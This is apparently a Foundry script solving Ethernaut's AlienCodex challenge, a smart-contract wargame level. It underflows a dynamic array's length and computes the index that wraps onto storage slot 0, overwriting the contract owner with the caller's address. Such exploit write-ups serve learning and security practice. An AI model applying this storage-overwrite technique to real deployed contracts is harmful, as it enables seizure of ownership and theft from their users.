// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { AlienCodex } from "src/interfaces/ILevel19.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x0BC04aa6aaC163A6B3667636D798FA053D43BD11);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        AlienCodex instance = AlienCodex(instanceAddress);

        (,, address txOrigin) = vm.readCallers();
        instance.makeContact();
        instance.retract(); // length is now type(uint256).max
        uint256 slot = uint256(keccak256(abi.encode(1))); // slot of first array element (index 0)
        uint256 slotDiff = type(uint256).max - slot + 1; // overflow the slot position
        bytes32 addy = bytes32(uint256(uint160(txOrigin)));
        instance.revise(slotDiff, addy);
        require(instance.owner() == txOrigin, "not owner");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
